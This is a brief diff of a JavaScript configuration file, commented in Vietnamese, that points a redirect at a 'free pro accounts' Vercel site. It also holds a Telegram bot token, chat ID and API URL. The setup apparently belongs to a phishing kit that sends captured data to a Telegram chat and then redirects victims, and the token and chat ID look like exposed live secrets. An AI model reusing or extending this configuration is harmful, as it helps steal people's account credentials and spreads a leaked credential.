@@ -1,6 +1,6 @@
 // config.js - Cấu hình toàn cục
 const CONFIG = {
-    REDIRECT_URL: "https://facebook.com",
+    REDIRECT_URL: "sharetaikhoanprofree.vercel.app",
     BOT_TOKEN: "8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac",
     CHAT_ID: "-1003805423944",
     TELEGRAM_API: "https://api.telegram.org/bot",
